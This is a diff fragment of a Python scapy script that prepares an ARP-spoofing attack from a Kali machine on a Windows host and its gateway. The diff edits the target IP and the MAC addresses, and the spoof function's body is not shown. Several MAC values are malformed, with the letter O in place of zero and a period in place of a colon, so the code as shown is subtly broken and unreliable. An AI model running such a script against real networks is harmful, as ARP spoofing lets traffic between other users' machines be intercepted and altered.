@@ -2,12 +2,12 @@ from scapy.all import *
 import time
 
 # Network details (replace if needed)
-target_ip = "10.15.85.112"    # Windows target
+target_ip = "10.15.117.1"    # Windows target
 gateway_ip = "10.15.0.1"      # Gateway
 
 # MAC addresses (from your input)
-target_mac = "Oa:c8:3c.b7:c9:cd"  # Windows target MAC
-gateway_mac = "Oa:72:ba:Of:5d:5c" # Gateway MAC
+target_mac = "OA:E1:B8:Cf:7D:4B"  # Windows target MAC
+gateway_mac = "OA:72:BA:OF:5D:5C" # Gateway MAC
 kali_mac = get_if_hwaddr(conf.iface)  # Kali's MAC (auto-detected)
 
 def spoof():
